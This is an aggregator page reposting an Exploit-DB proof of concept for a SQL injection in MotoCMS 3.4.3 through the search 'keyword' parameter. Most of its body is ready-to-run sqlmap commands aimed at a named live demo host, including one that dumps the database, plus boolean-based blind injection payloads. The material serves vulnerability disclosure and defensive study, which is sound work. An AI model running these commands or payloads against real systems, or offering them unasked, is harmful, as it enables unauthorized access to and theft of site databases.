---
title: [webapps] MotoCMS Version 3.4.3 - SQL Injection
url: https://buaq.net/go-167184.html
source: unSafe.sh - 不安全
date: 2023-06-05
fetch_date: 2025-10-04T11:44:39.938985
---

# [webapps] MotoCMS Version 3.4.3 - SQL Injection

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

[webapps] MotoCMS Version 3.4.3 - SQL Injection

# Title: MotoCMS Version 3.4.3 - SQL Injection#
*2023-6-4 08:0:0
Author: [www.exploit-db.com(查看原文)](/jump-167184.htm)
阅读量:28
收藏*

---

```
# Title: MotoCMS Version 3.4.3 - SQL Injection
# Author: tmrswrr
# Date: 01/06/2023
# Vendor: https://www.motocms.com
# Link: https://www.motocms.com/website-templates/demo/189526.html
# Vulnerable Version(s): MotoCMS  3.4.3

## Description
MotoCMS Version 3.4.3 SQL Injection via the keyword parameter.

## Steps to Reproduce

1) By visiting the url:
https://template189526.motopreview.com/store/category/search/?keyword=1

2) Run sqlmap -u "https://template189526.motopreview.com/store/category/search/?keyword=1" --random-agent --level 5 --risk 3 --batch  and this command sqlmap -u "https://template189526.motopreview.com/store/category/search/?keyword=1*" --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump

### Parameter & Payloads ###

Parameter: keyword (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: keyword=1%' AND 3602=3602 AND 'ZnYV%'='ZnYV

Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: https://template189526.motopreview.com:443/store/category/search/?keyword=1%' AND 6651=6651 AND 'BvJE%'='BvJE
```

文章来源: https://www.exploit-db.com/exploits/51504
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)